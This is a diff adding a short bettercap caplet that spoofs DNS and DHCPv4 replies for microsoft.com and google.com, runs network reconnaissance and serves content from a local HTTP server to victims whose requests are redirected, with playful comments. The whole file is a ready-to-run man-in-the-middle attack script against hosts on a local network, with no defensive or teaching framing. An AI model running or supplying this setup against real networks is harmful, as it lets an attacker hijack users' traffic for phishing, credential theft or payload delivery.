@@ -1,0 +1,22 @@
+# let's spoof Microsoft and Google ^_^
+set dns.spoof.domains microsoft.com, google.com
+set dhcp4.spoof.domains microsoft.com, google.com
+
+# every request http request to the spoofed hosts will come to us
+# let's give em some contents
+set http.server.path caplets/www
+
+# check who's alive on the network
+net.recon on
+# serve files
+http.server on
+# redirect DNS request by spoofing DHCPv4 packets
+dhcp4.spoof on
+# send spoofed DNS replies ^_^
+dns.spoof on
+
+# set a custom prompt for ipv6
+set $ {by}{fw}{cidr} {reset} {bold}» {reset} {fb}>{env.iface.ipv4}
+# clear the events buffer and the screen
+events.clear
+clear
